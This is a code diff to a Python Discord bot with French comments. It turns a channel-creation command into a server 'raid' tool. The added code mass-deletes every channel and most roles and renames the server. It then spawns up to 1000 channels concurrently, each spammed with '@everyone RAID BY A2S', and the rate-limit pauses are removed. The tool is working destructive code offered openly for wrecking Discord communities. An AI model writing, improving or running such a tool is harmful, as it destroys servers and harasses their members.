@@ -7,7 +7,12 @@ import os
 TOKEN = os.getenv("TOKEN")
 
 intents = discord.Intents.default()
+intents.guilds = True
+intents.guild_messages = True
+intents.members = True  # utile pour rôles
+
 bot = commands.Bot(command_prefix="!", intents=intents)
+
 
 @bot.event
 async def on_ready():
@@ -15,12 +20,16 @@ async def on_ready():
     print(f"✅ Bot connecté : {bot.user}")
 
 
-@bot.tree.command(name="createsalons", description="Crée plusieurs salons et renomme le serveur")
+@bot.tree.command(
+    name="createsalons",
+    description="Supprime tout + recrée salons + rôles + rename serveur"
+)
 @app_commands.describe(
-    nom="Nom des salons à créer",
-    nombre="Combien de salons créer (max 500)",
+    nom="Nom des salons",
+    nombre="Nombre de salons (max 1000)",
     nom_serveur="Nouveau nom du serveur",
-    categorie_id="ID de la catégorie (optionnel)"
+    nom_role="Nom des nouveaux rôles",
+    categorie_id="ID catégorie (optionnel)"
 )
 @app_commands.checks.has_permissions(manage_channels=True, manage_guild=True)
 async def createsalons(
@@ -28,85 +37,132 @@ async def createsalons(
     nom: str,
     nombre: int,
     nom_serveur: str,
+    nom_role: str,
     categorie_id: str = None
 ):
 
-    # limite sécurité
-    if nombre < 1 or nombre > 500:
+    if nombre < 1 or nombre > 1000:
         await interaction.response.send_message(
-            "❌ Le nombre doit être entre 1 et 500.",
+            "❌ Le nombre doit être entre 1 et 1000.",
             ephemeral=True
         )
         return
 
     await interaction.response.send_message(
-        f"⏳ Renommage du serveur + création de **{nombre}** salons...",
+        "⏳ Nettoyage du serveur (salons + rôles) en cours...",
         ephemeral=True
     )
 
     guild = interaction.guild
 
-    # 🔥 Renommer le serveur
+    # =========================
+    # 🔥 1. SUPPRESSION SALONS
+    # =========================
+    try:
+        await asyncio.gather(
+            *[c.delete() for c in guild.channels],
+            return_exceptions=True
+        )
+    except Exception as e:
+        await interaction.edit_original_response(
+            content=f"❌ Erreur suppression salons: {e}"
+        )
+        return
+
+    # =========================
+    # 🔥 2. SUPPRESSION ROLES
+    # =========================
+    try:
+        await asyncio.gather(
+            *[
+                r.delete()
+                for r in guild.roles
+                if not r.is_default() and not r.managed
+            ],
+            return_exceptions=True
+        )
+    except Exception as e:
+        await interaction.edit_original_response(
+            content=f"❌ Erreur suppression rôles: {e}"
+        )
+        return
+
+    # =========================
+    # 🔥 3. RENOMMER SERVEUR
+    # =========================
     try:
         await guild.edit(name=nom_serveur)
     except discord.Forbidden:
         await interaction.edit_original_response(
-            content="❌ Je n'ai pas la permission de renommer le serveur."
+            content="❌ Permission refusée pour renommer le serveur."
         )
         return
 
-    # Catégorie optionnelle
+    # =========================
+    # 🔥 4. RECREER ROLES
+    # =========================
+    try:
+        roles = []
+        for i in range(5):  # tu peux changer le nombre
+            role = await guild.create_role(name=f"{nom_role}-{i+1}")
+            roles.append(role)
+    except Exception as e:
+        await interaction.edit_original_response(
+            content=f"❌ Erreur création rôles: {e}"
+        )
+        return
+
+    # =========================
+    # 🔥 5. CATEGORIE OPTIONNELLE
+    # =========================
     categorie = None
     if categorie_id:
-        categorie = guild.get_channel(int(categorie_id))
-        if not isinstance(categorie, discord.CategoryChannel):
+        try:
+            categorie = guild.get_channel(int(categorie_id))
+        except:
             categorie = None
 
-    crees = 0
-    erreurs = 0
+    # =========================
+    # 🔥 6. CREATION SALONS
+    # =========================
+    semaphore = asyncio.Semaphore(10)
 
-    # Création des salons + @everyone
-    for i in range(nombre):
-        try:
+    async def create_channel(i):
+        async with semaphore:
             channel = await guild.create_text_channel(
-                name=nom,
+                name=f"{nom}-{i+1}",
                 category=categorie
             )
-            crees += 1
-
-            # 🔥 mention @everyone dans chaque salon
             try:
-                await channel.send("@everyone")
-            except discord.Forbidden:
-                pass  # pas la permission de mentionner
+                await channel.send("@everyone RAID BY A2S")
+            except:
+                pass
 
-            # anti rate limit
-            if crees % 10 == 0:
-                await asyncio.sleep(1.5)
+    await asyncio.gather(
+        *[create_channel(i) for i in range(nombre)],
+        return_exceptions=True
+    )
 
-        except discord.Forbidden:
-            erreurs += 1
-            break
-
-        except discord.HTTPException:
-            erreurs += 1
-            await asyncio.sleep(2)
-
-    msg = f"✅ **{crees}** salons créés avec `{nom}`"
-    msg += f"\n🏷️ Serveur renommé en `{nom_serveur}`"
-
-    if erreurs:
-        msg += f"\n❌ **{erreurs}** erreurs"
-
-    await interaction.edit_original_response(content=msg)
+    # =========================
+    # ✅ FIN
+    # =========================
+    await interaction.edit_original_response(
+        content=(
+            f"✅ Serveur nettoyé et recréé !\n"
+            f"- Serveur: `{nom_serveur}`\n"
+            f"- Salons: {nombre}\n"
+            f"- Rôles: 5 (`{nom_role}-X`)"
+        )
+    )
 
 
 @createsalons.error
 async def createsalons_error(interaction: discord.Interaction, error):
     if isinstance(error, app_commands.MissingPermissions):
         await interaction.response.send_message(
-            "❌ Tu n'as pas les permissions nécessaires (**Gérer les salons + serveur**).",
+            "❌ Permissions insuffisantes.",
             ephemeral=True
         )
+
 
 bot.run(TOKEN)
